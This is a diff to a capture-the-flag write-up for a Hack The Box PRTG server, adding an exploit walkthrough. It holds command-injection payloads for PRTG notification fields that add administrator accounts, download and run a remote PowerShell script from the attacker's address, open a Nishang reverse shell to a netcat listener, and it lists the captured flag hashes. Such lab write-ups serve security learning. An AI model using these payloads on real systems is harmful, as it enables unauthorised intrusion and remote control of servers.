@@ -10,7 +10,6 @@
     - [FTP](#ftp)
     - [Web Service](#web-service)
 - [Exploit](#exploit)
-- [Post Exploit](#post-exploit)
 - [Flags](#flags)
     - [User Flag](#user-flag)
     - [Root Flag](#root-flag)
@@ -149,8 +148,87 @@ Password: PrTg@dmin2019
 ```
 
 # Exploit
+The post says that we can run external programs using a notification. To test this, lets make the server ping us back. First start tcpdump for icmp pcakets on the tun0 interface.
+```
+tcpdump -i tun0 icmp
+```
 
-# Post Exploit
+On the web page click on Setup > Account Settings > Notifications.
+Edit an existing notification by pressing on the edit icon to the right, and then press the wrench icon.
+
+![Installation files](./Pictures/icons.png)
+
+Scroll down to the "Execute Program". The post mentions that we cant run any program except the two provided, and the only the powershell script works.
+
+![Installation files](./Pictures/execute.png)
+
+As the _Program File_ choose outfile.ps1 and on the _Parameter_ paste:
+```
+test | ping -n 1 10.10.14.24
+```
+
+This will send one ping back to us (update the ip address as necessary). Save the changes and trigger the notification by clicking on the edit icon and then the bell icon. Look at the tcpdump, and success! the server pinged us back.
+
+Now that we know it works, lets try the command mentioned in the post:
+```
+test.txt | net user pentest password /add
+``` 
+This adds a user called _pentest_ with password _password_. Not sure how to use this new user, lets try FTP as the new user. Unfortunately this doesnt work. Trying again, now adding the user to the allowed FTP users:
+```
+test.txt | net user pentest password /add ; test.txt | net localgroup FTPUsers pentest /add
+```
+
+No luck. Again lets try adding to the administrators group:
+
+```
+test.txt | net user pentest password /add ; net localgroup administrators htb /add
+```
+and still cant FTP.
+
+> **Notice:** Later on I discovered that in order to connect you should use `psexec.py` 
+> which is psexec written in python. We can get it from [SecureAuthCorp - Impacket](https://github.com/SecureAuthCorp/impacket), but I didnt want to install it.
+> So the above commands might have worked.
+
+Lets try a reverse shell using the [Nishang](https://github.com/samratashok/nishang) _**Invoke-PowerShellTcp**_ shell script.
+
+> Clone the repo to `/opt` if you dont have it. 
+
+Copy the script, so we wont damage the original one, and rename it to something easy like _reverse.ps1_. Now edit the script and at the bootom, after the last `}`, add the following line:
+
+```
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.24 -Port 80
+```
+making sure to write the correct ip. Now start a python SimpleHTTPServer and a netcat listener:
+
+```
+python -m SimpleHTTPServer
+```
+
+```
+nc -lvnp 80
+```
+
+Just like before go to the webpage and add the following line to the Parameter field:
+
+```
+test|IEX(New-Object Net.WebClient).downloadString('http://10.10.14.24:8000/reverse.ps1')
+```
+
+Save the changes, and trigger the notification.
+
+On the python HTTP Server we can see that the script was downloaded, but wasnt executed because we didnt get a shell on the netcat listener. The post say that some characters get encoded, so the script probably has some bad characters. To resolve this we can try base64 encoding the script itself.
+
+```
+cat reverse.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard
+```
+This copies the output of the encoding to our clipbooard. Back in the notification parameter field:
+
+```
+test | powershell -enc [Encoded Script]
+```
+**Without** the square brackets!
+
+Finally the netcat listener returns a shell. Go to the Administrator Desktop to find the flag.
 
 # Flags
 
@@ -159,4 +237,6 @@ The User.txt file can be found on `Users\Public` folder. **dd58ce67b49e15105e880
 
 
 ### Root Flag
+
+The root.txt file is on the desktop of the Administrator user. **3018977fb944bf1878f75b879fba67cc**
 
